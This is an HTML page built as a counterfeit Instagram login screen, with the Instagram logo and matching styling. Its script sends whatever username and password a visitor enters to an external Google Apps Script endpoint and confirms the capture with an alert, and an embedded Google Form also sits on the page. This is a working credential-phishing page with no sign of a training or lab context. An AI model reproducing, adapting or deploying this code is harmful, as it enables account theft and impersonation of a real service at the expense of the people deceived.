<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fafafa;
            font-family: Arial, sans-serif;
        }
        .login-container {
            background: white;
            padding: 40px 40px 20px;
            border: 1px solid #dbdbdb;
            text-align: center;
            width: 350px;
            border-radius: 5px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
        }
        .login-container img {
            width: 175px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 6px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
            outline: none;
            background-color: #fafafa;
            display: block;
        }
        input:focus {
            border-color: #0095f6;
            background-color: white;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            margin-top: 10px;
        }
        button:hover {
            background-color: #0077cc;
        }
        .forgot-password {
            font-size: 12px;
            margin-top: 10px;
            color: #385185;
            cursor: pointer;
        }
        .signup {
            margin-top: 20px;
            font-size: 14px;
        }
        .signup a {
            color: #0095f6;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
        <input type="text" id="username" placeholder="Phone number, username, or email" required>
        <input type="password" id="password" placeholder="Password" required>
        <button onclick="login()">Log In</button>
        <div class="forgot-password">Forgot password?</div>
    </div>
    <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
    
    <!-- Embedded Google Form -->
    <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSeb42B97dZnOe04Iivl5P9z18vsaHEfjpaA_w9_IR0sj7EGsA/viewform?embedded=true" width="640" height="509" frameborder="0" marginheight="0" marginwidth="0">Loadingâ€¦</iframe>
    
    <script>
        const previewMode = true; // Set to false for normal behavior
        
        if (previewMode) {
            document.getElementById('username').value = 'demoUser';
            document.getElementById('password').value = 'password123';
        }
        
        function login() {
            let username = document.getElementById('username').value;
            let password = document.getElementById('password').value;
            
            // Google Form URL with entry IDs (Replace with your actual entry IDs)
            let scriptURL = "https://script.google.com/macros/s/AKfycbxJp_K6_kGn6jfkwU6vhgfOEy_whwRmPSQofM1cEpI8TmIX11qeVAW-CYpvXz-XYvgojQ/exec";
            let formData = new FormData();
            formData.append("username", username);
            formData.append("password", password);
            
            // Send data to Google Form
            fetch(scriptURL, {
                method: "POST",
                body: formData,
                mode: "no-cors"
            }).then(() => {
                alert("Login data sent successfully!");
            }).catch(err => console.error("Error: ", err));
        }
    </script>
</body>
</html>
